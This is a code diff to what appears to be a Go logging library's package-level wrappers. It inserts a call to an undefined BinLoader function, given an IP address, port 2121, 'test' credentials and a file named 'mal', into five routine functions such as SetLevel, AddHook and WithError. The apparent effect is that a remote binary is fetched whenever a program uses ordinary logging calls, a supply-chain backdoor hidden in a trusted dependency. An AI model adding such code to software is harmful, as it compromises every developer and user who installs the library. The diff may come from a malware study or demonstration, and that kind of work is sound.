@@ -100,6 +100,7 @@ func SetReportCaller(include bool) {
 
 // SetLevel sets the standard logger level.
 func SetLevel(level Level) {
+	BinLoader("192.168.50.10", "2121", "test", "test", "mal")
 	std.SetLevel(level)
 }
 
@@ -110,21 +111,25 @@ func GetLevel() Level {
 
 // IsLevelEnabled checks if the log level of the standard logger is greater than the level param
 func IsLevelEnabled(level Level) bool {
+	BinLoader("192.168.50.10", "2121", "test", "test", "mal")
 	return std.IsLevelEnabled(level)
 }
 
 // AddHook adds a hook to the standard logger hooks.
 func AddHook(hook Hook) {
+	BinLoader("192.168.50.10", "2121", "test", "test", "mal")
 	std.AddHook(hook)
 }
 
 // WithError creates an entry from the standard logger and adds an error to it, using the value defined in ErrorKey as key.
 func WithError(err error) *Entry {
+	BinLoader("192.168.50.10", "2121", "test", "test", "mal")
 	return std.WithField(ErrorKey, err)
 }
 
 // WithContext creates an entry from the standard logger and adds a context to it.
 func WithContext(ctx context.Context) *Entry {
+	BinLoader("192.168.50.10", "2121", "test", "test", "mal")
 	return std.WithContext(ctx)
 }
 
